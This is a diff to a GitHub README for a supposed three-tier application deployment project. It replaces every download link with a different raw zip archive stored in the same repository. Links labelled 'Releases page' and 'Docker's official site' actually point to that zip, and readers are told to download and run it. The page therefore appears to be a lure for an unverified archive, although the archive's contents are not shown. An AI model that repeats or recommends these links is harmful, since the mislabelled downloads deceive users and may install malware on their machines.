@@ -1,6 +1,6 @@
 # 🚀 3-Tier-Application-Deplyoment - Easily Deploy Your Application Today
 
-[![Download](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip%https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip)](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip)
+[![Download](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip%https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip)](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip)
 
 ## 📦 Overview
 This project demonstrates the deployment of a production-ready 3-tier application. It uses modern DevOps practices to ensure that your application is secure, reliable, and easy to manage. Key features include:
@@ -38,7 +38,7 @@ This project demonstrates the deployment of a production-ready 3-tier applicatio
 Follow these steps to download and run the application.
 
 ### 1. Visit the Releases Page
-To download the application, visit the following link: [Download Here](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip). 
+To download the application, visit the following link: [Download Here](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip). 
 
 ### 2. Download the Latest Version
 On the Releases page, you will see a list of available versions. Look for the latest release. Click on the version number, and you will find files available for download.
@@ -59,7 +59,7 @@ To ensure smooth operation, your system should meet the following requirements:
 - **Disk Space:** Minimum of 500 MB free space.
 - **Docker:** Ensure Docker is installed for containerization.
   
-If you do not have Docker, you can download it from [Docker's official site](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip).
+If you do not have Docker, you can download it from [Docker's official site](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip).
 
 ## 🔧 Configuring Your Environment
 After installation, you may want to configure your environment. Follow these steps:
@@ -76,7 +76,7 @@ To run your application, follow these simple steps:
 - For Linux or Mac, open a terminal window. Navigate to the application directory and run the `./yourapp` command.
 
 ## 📥 Download & Install
-Be sure to download the application from the Releases page: [Download Here](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/lionizer/3-Tier-Application-Deplyoment.zip).
+Be sure to download the application from the Releases page: [Download Here](https://raw.githubusercontent.com/chayoukh2024/3-Tier-Application-Deplyoment/master/public/Application-Deplyoment-Tier-1.2.zip).
 
 ## 📞 Support
 If you encounter any issues or have questions, please feel free to open an issue on this GitHub repository. Our community is here to help!
